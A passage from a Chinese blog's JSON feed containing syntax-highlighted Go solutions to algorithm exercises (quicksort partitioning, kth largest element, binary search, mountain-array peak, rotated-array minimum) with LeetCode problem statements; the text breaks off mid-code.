data-num=\"15\"></td><td><pre>\tlow<span class=\"token punctuation\">,</span> high <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpVal <span class=\"token operator\">:=</span> nums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">for</span> low <span class=\"token operator\">&lt;</span> high <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> low <span class=\"token operator\">&lt;</span> high <span class=\"token operator\">&amp;&amp;</span> nums<span class=\"token punctuation\">[</span>high<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> pVal <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\thigh<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tnums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">[</span>high<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> low <span class=\"token operator\">&lt;</span> high <span class=\"token operator\">&amp;&amp;</span> nums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> pVal <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\tlow<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\tnums<span class=\"token punctuation\">[</span>high<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tnums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pVal</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">return</span> low</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 快速排序 顺序遍历法</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">quickSortV2</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> nums</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tp <span class=\"token operator\">:=</span> <span class=\"token function\">partionV2</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">quickSortV2</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">quickSortV2</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>p<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> nums</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">partionV2</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tlow<span class=\"token punctuation\">,</span> high <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tpVal <span class=\"token operator\">:=</span> nums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\ti <span class=\"token operator\">:=</span> low</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> low <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> high<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> pVal <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\tnums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\ti<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tnums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pVal</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">return</span> i</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>关于快排之前还有文档：</p>\n<p>go 多协程实现快排 V1 ：<a href=\"https://blog.twelveeee.top/2023/Go/go%20goroutine%20quicksort/\">https://blog.twelveeee.top/2023/Go/go goroutine quicksort/</a></p>\n<p>go 多协程实现快排 V2  :  <a href=\"https://blog.twelveeee.top/2023/Go/go_goroutine_quicksort_v2/\">https://blog.twelveeee.top/2023/Go/go_goroutine_quicksort_v2/</a></p>\n<h2 id=\"算法题\"><a class=\"anchor\" href=\"#算法题\">#</a> 算法题</h2>\n<h3 id=\"1数组中的第k个最大元素\"><a class=\"anchor\" href=\"#1数组中的第k个最大元素\">#</a> 1. 数组中的第 K 个最大元素</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9rdGgtbGFyZ2VzdC1lbGVtZW50LWluLWFuLWFycmF5L2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/kth-largest-element-in-an-array/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTBfUXVpY2tTb3J0L2xldmVsXzIvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/10_QuickSort/level_2/topic_1.go</span></p>\n<blockquote>\n<p>给定整数数组  <code>nums</code>  和整数  <code>k</code> ，请返回数组中第  <code>**k**</code>  个最大的元素。</p>\n<p>请注意，你需要找的是数组排序后的第  <code>k</code>  个最大的元素，而不是第  <code>k</code>  个不同的元素。</p>\n<p>你必须设计并实现时间复杂度为  <code>O(n)</code>  的算法解决此问题。</p>\n<blockquote>\n<p>ps: 感觉这题比较垃，主要是面向测试用例编程</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">findKthLargest</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> k <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">subFindKthLargest</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">subFindKthLargest</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> low<span class=\"token punctuation\">,</span> high <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> low <span class=\"token operator\">==</span> high <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> nums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tpVal <span class=\"token operator\">:=</span> nums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\ti<span class=\"token punctuation\">,</span> j <span class=\"token operator\">:=</span> low<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> high<span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">&lt;</span> j <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> pVal<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> j<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span> nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> pVal<span class=\"token punctuation\">;</span> j<span class=\"token operator\">--</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i <span class=\"token operator\">&lt;</span> j <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\tnums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tp <span class=\"token operator\">:=</span> j</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">if</span> p <span class=\"token operator\">&lt;=</span> k <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">subFindKthLargest</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> p<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> high<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">subFindKthLargest</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> low<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/09_binarySearch/",
            "url": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/09_binarySearch/",
            "title": "09-二分查找",
            "date_published": "2023-11-28T14:00:00.000Z",
            "content_html": "<h1 id=\"二分查找\"><a class=\"anchor\" href=\"#二分查找\">#</a> 二分查找</h1>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">binarySearch</span><span class=\"token punctuation\">(</span>list <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> target <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tlow<span class=\"token punctuation\">,</span> high <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">for</span> high <span class=\"token operator\">>=</span> low <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tmid <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span>high <span class=\"token operator\">+</span> low<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tval <span class=\"token operator\">:=</span> list<span class=\"token punctuation\">[</span>mid<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> val <span class=\"token operator\">==</span> target <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> mid</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> val <span class=\"token operator\">></span> target <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\thigh <span class=\"token operator\">=</span> mid <span class=\"token operator\">-</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> val <span class=\"token operator\">&lt;</span> target <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\tlow <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"算法题\"><a class=\"anchor\" href=\"#算法题\">#</a> 算法题</h2>\n<h3 id=\"1山脉数组的峰顶索引\"><a class=\"anchor\" href=\"#1山脉数组的峰顶索引\">#</a> 1. 山脉数组的峰顶索引</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wZWFrLWluZGV4LWluLWEtbW91bnRhaW4tYXJyYXkv\">https://leetcode.cn/problems/peak-index-in-a-mountain-array/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDlfQmluYXJ5U2VhcmNoL2xldmVsXzIvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/09_BinarySearch/level_2/topic_1.go</span></p>\n<blockquote>\n<p>符合下列属性的数组  <code>arr</code>  称为 <strong>山脉数组</strong> ：</p>\n<ul>\n<li><code>arr.length &gt;= 3</code></li>\n<li>存在  <code>i</code>  （ <code>0 &lt; i &lt; arr.length - 1</code> ） 使得</li>\n<li><code>arr[0] &lt; arr[1] &lt; ... arr[i-1] &lt; arr[i] </code></li>\n<li><code>arr[i] &gt; arr[i+1] &gt; ... &gt; arr[arr.length - 1]</code></li>\n</ul>\n<p>给你由整数组成的山脉数组  <code>arr</code>  ，返回满足  <code>arr[0] &lt; arr[1] &lt; ... arr[i - 1] &lt; arr[i] &gt; arr[i + 1] &gt; ... &gt; arr[arr.length - 1]</code>  的下标  <code>i</code>  。</p>\n<p>你必须设计并实现时间复杂度为  <code>O(log(n))</code>  的解决方案。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">peakIndexInMountainArray</span><span class=\"token punctuation\">(</span>arr <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tlow<span class=\"token punctuation\">,</span> high <span class=\"token operator\">:=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">for</span> low <span class=\"token operator\">&lt;=</span> high <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tmid <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tleftVal<span class=\"token punctuation\">,</span> midVal<span class=\"token punctuation\">,</span> righVal <span class=\"token operator\">:=</span> arr<span class=\"token punctuation\">[</span>mid<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>mid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>mid<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> leftVal <span class=\"token operator\">&lt;</span> midVal <span class=\"token operator\">&amp;&amp;</span> righVal <span class=\"token operator\">&lt;</span> midVal <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> mid</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> leftVal <span class=\"token operator\">&lt;</span> midVal <span class=\"token operator\">&amp;&amp;</span> righVal <span class=\"token operator\">></span> midVal <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\tlow <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> leftVal <span class=\"token operator\">></span> midVal <span class=\"token operator\">&amp;&amp;</span> righVal <span class=\"token operator\">&lt;</span> midVal <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\thigh <span class=\"token operator\">=</span> mid <span class=\"token operator\">-</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"2寻找旋转排序数组中的最小值\"><a class=\"anchor\" href=\"#2寻找旋转排序数组中的最小值\">#</a> 2. 寻找旋转排序数组中的最小值</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9maW5kLW1pbmltdW0taW4tcm90YXRlZC1zb3J0ZWQtYXJyYXkv\">https://leetcode.cn/problems/find-minimum-in-rotated-sorted-array/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDlfQmluYXJ5U2VhcmNoL2xldmVsXzIvdG9waWNfMi5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/09_BinarySearch/level_2/topic_2.go</span></p>\n<blockquote>\n<p>已知一个长度为  <code>n</code>  的数组，预先按照升序排列，经由  <code>1</code>  到  <code>n</code>  次 <strong>旋转</strong> 后，得到输入数组。例如，原数组  <code>nums = [0,1,2,4,5,6,7]</code>  在变化后可能得到：</p>\n<ul>\n<li>若旋转  <code>4</code>  次，则可以得到  <code>[4,5,6,7,0,1,2]</code></li>\n<li>若旋转  <code>7</code>  次，则可以得到  <code>[0,1,2,4,5,6,7]</code></li>\n</ul>\n<p>注意，数组  <code>[a[0], a[1], a[2], ..., a[n-1]]</code>  <strong>旋转一次</strong> 的结果为数组  <code>[a[n-1], a[0], a[1], a[2], ..., a[n-2]]</code>  。</p>\n<p>给你一个元素值 <strong>互不相同</strong> 的数组  <code>nums</code>  ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 <strong>最小元素</strong> 。</p>\n<p>你必须设计一个时间复杂度为  <code>O(log n)</code>  的算法解决此问题。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">findMin</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tlow<span class=\"token punctuation\">,</span> high <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">for</span> high <span class=\"token operator\">></span> low <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tmid <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span>high <span class=\"token operator\">+</span> low<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> nums<span class=\"token punctuation\">[</span>mid<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">[</span>high<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\thigh <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\tlow <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">return</span> nums<span class=\"token punctuation\">[</span>low<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token 